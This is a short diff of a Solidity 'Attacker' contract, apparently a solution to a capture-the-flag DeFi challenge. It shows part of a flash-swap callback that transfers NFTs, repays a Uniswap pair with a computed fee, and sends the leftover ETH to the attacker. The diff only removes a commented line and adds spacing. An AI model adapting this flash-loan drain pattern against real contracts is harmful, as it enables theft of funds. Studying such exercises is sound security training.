@@ -97,16 +97,17 @@ contract Attacker is IERC721Receiver, ReentrancyGuard {
             _nft.safeTransferFrom(address(this), _buyer, tokenId);
         }
 
-        // freeRiderNFTMarketplace.buyMany{value: 15 ether}(tokenIds);
         // about 0.3% fee, +1 to round up
         uint fee = (amount1 * 3) / 997 + 1;
         uint256 amountToRepay = amount1 + fee;
+
         weth.deposit{value: amountToRepay}();
         // Transfer flash swap fee from caller
         weth.transferFrom(caller, address(this), fee);
 
         // Repay
         weth.transfer(address(uniswapV2Pair), amountToRepay);
+
         weth.withdraw(weth.balanceOf(address(this)));
         payable(_attacker).sendValue(address(this).balance);
     }
